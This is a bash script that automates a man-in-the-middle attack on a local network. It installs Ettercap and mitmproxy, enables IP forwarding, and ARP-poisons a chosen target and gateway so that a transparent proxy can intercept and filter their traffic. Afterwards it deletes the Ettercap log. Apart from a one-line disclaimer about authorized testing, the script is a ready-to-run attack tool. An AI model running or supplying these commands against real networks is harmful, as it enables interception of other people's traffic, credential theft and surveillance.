#!/bin/bash
# MITM Setup Script with Colored Output
# This script sets up a MITM environment using Ettercap and Mitmproxy.
# It installs necessary packages, enables IP forwarding, compiles an Ettercap filter,
# and runs Ettercap with user-provided gateway, target IP, and network interface.
#
# Disclaimer: Use this script only for authorized testing and educational purposes.

# ---------------------------
# Define color variables
# ---------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# ---------------------------
# Main function
# ---------------------------
main() {
    echo -e "${YELLOW}[-] Starting MITM setup...${NC}"
    
    # Install necessary packages
    echo -e "${BLUE}[*] Installing required packages...${NC}"
    sudo apt-get install ettercap-common ettercap-graphical -y
    pip3 install mitmproxy

    # Start mitmproxy in transparent mode (runs in the background)
    echo -e "${BLUE}[*] Starting mitmproxy in transparent mode...${NC}"
    mitmproxy --mode transparent --showhost --set block_global=false &

    # Enable IP forwarding
    echo -e "${BLUE}[*] Enabling IP forwarding...${NC}"
    sudo sysctl -w net.ipv4.ip_forward=1

    # Get user input
    read -p "$(echo -e ${YELLOW}[?] Enter the Gateway IP:${NC} )" GATEWAY_IP
    read -p "$(echo -e ${YELLOW}[?] Enter the Target IP:${NC} )" TARGET_IP
    read -p "$(echo -e ${YELLOW}[?] Enter the network interface (e.g., eth0):${NC} )" INTERFACE

    # Compile the Ettercap filter
    echo -e "${BLUE}[*] Compiling Ettercap filter...${NC}"
    sudo etterfilter proxy_filter.ef -o proxy_filter.efilter

    # Run Ettercap with the provided inputs
    echo -e "${BLUE}[*] Running Ettercap with the provided inputs...${NC}"
    sudo ettercap -T -q -i "$INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//

    # Optional: Uncomment the following block to run Ettercap a second time if needed
    #: <<'END_COMMENT'
    # echo -e "${BLUE}[*] Recompiling and re-running Ettercap (optional)...${NC}"
    # sudo etterfilter proxy_filter.ef -o proxy_filter.efilter
    # sudo ettercap -T -q -i "$INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//
    #END_COMMENT

    # Start mitmproxy again if desired (runs in the background)
    echo -e "${BLUE}[*] Starting mitmproxy again in transparent mode...${NC}"
    mitmproxy --mode transparent --showhost &

    # Run Ettercap again for further processing (if needed)
    echo -e "${BLUE}[*] Running Ettercap again for further processing...${NC}"
    sudo ettercap -T -q -i "$INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//

    # Disable IP forwarding and clean up
    echo -e "${BLUE}[*] Disabling IP forwarding...${NC}"
    sudo sysctl -w net.ipv4.ip_forward=0

    echo -e "${BLUE}[*] Cleaning up Ettercap logs...${NC}"
    rm -f /tmp/ettercap_http.log

    echo -e "${GREEN}[+] MITM setup complete. Exiting.${NC}"
}

# ---------------------------
# Execute the main function
# ---------------------------
main